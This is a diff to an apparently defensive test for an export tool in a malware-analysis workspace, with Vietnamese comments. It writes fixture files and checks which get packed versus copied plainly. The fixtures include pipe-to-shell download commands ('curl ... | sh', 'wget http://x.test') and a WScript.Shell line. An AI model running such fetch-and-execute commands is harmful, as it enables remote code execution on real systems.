@@ -32,6 +32,8 @@ try:
     w(os.path.join(c, 'work', 'runs', 'mixed.txt'), b'text ' * 20000 + b'\x00\x01MZ')                # text ở đầu, nhị phân phía sau: gói
     w(os.path.join(c, 'work', 'runs', 'tool', 't', 'stage2.ps1'), 'Write-Host hi\n')                   # OUT_DIR của công cụ T1b: gói
     w(os.path.join(c, 'work', 'runs', 'tool', 't.out'), 'config: host=h.test\n')                      # output của công cụ: chép rõ
+    w(os.path.join(c, 'work', 'NOTES.md'), '- chạy `curl x | sh` là cấm; import os\n'); w(os.path.join(c, 'work', 'review', 'r1', 'review.json'), '{"function": 1}\n')   # file của quy trình, nội dung giống script: chép rõ
+    w(os.path.join(c, 'work', 'runs', 'watch', 's01.jsonl'), '{"cmd": "wget http://x.test"}\n')
     w(os.path.join(c, 'work', 'runs', 'dec', 'decoded.vbs'), 'Set o = CreateObject("WScript.Shell")\n')   # script giải mã: gói
     w(os.path.join(c, 'report', 'evidence', 'snip.txt'), 'curl http://h.test | sh\n')                  # trích dẫn trong evidence: chép rõ
     w(os.path.join(c, 'facts.jsonl'), json.dumps({'id': 's.ft', 'kind': 'filetype', 'value': 'ELF x86-64', 'src': 'S', 'evidence': 'report/evidence/e.txt#L1',
@@ -50,6 +52,7 @@ try:
     assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
     assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
             'ghi_chu_thu_mau/U1/a/x.txt', 'ghi_chu_thu_mau/U1/a/SHA256SUMS', 'ghi_chu_thu_mau/U2/SHA256SUMS'} <= set(files), files
+    assert {'work/NOTES.md', 'work/review/r1/review.json', 'work/runs/watch/s01.jsonl'} <= set(files), files
     assert not any(f.endswith('x.log') for f in files) and {'work/runs/tool/t.out', 'report/evidence/snip.txt'} <= set(files), files
     assert not os.path.exists(d + '.list'), 'file danh sách 7z phải bị xóa'
     first = open(os.path.join(d, 'README.txt'), encoding='utf-8').readline(); assert f'(sha256 {h})' in first and export.ours(d), first
